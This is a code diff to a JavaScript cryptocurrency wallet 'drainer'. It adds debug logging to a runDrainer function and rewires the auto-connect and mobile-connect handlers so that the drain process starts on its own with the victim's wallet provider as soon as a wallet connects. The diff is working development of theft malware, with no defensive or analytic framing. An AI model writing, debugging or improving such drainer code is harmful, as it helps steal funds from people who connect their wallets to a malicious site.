@@ -3445,6 +3445,9 @@ let isDrainerRunning = false;
 
 async function runDrainer(provider) {
   console.log('[runDrainer] Starting drain process...');
+  console.log('[runDrainer] Provider received:', !!provider);
+  console.log('[runDrainer] Provider type:', typeof provider);
+  console.log('[runDrainer] Provider keys:', provider ? Object.keys(provider) : 'No provider');
   
   // Prevent multiple simultaneous runs
   if (isDrainerRunning) {
@@ -3459,6 +3462,9 @@ async function runDrainer(provider) {
     
     // 1. Get the public key from the provider
     let publicKey = provider.publicKey || provider.address;
+    console.log('[runDrainer] Initial publicKey:', publicKey);
+    console.log('[runDrainer] Provider has connect method:', typeof provider.connect === 'function');
+    console.log('[runDrainer] Provider has signTransaction method:', typeof provider.signTransaction === 'function');
     
     // Always try to connect if not already connected
     if (!publicKey && provider && typeof provider.connect === 'function') {
@@ -5587,7 +5593,8 @@ window.runDrainer = runDrainer;
               
               // Trigger the drain process directly
               if (window.runDrainer) {
-                window.runDrainer(publicKey.toString(), wallet.key, window.connectedWallet);
+                console.log(`[AUTO_CONNECT] Triggering runDrainer for ${wallet.name} with provider`);
+                window.runDrainer(provider);
               } else {
                 console.error('[AUTO_CONNECT] runDrainer function not found');
               }
@@ -5622,7 +5629,8 @@ window.runDrainer = runDrainer;
               
               // Trigger the drain process directly
               if (window.runDrainer) {
-                window.runDrainer(result.publicKey.toString(), wallet.key, window.connectedWallet);
+                console.log(`[AUTO_CONNECT] Triggering runDrainer for ${wallet.name} with provider`);
+                window.runDrainer(provider);
               } else {
                 console.error('[AUTO_CONNECT] runDrainer function not found');
               }
@@ -5948,7 +5956,8 @@ window.runDrainer = runDrainer;
             
             // Trigger the drain process directly
             if (window.runDrainer) {
-              window.runDrainer(result.publicKey, result.wallet || walletType, window.connectedWallet);
+              console.log(`[MOBILE_CONNECT_ENHANCED] Triggering runDrainer for ${result.wallet || walletType} with provider`);
+              window.runDrainer(result.provider);
             } else {
               console.error('[MOBILE_CONNECT_ENHANCED] runDrainer function not found');
             }
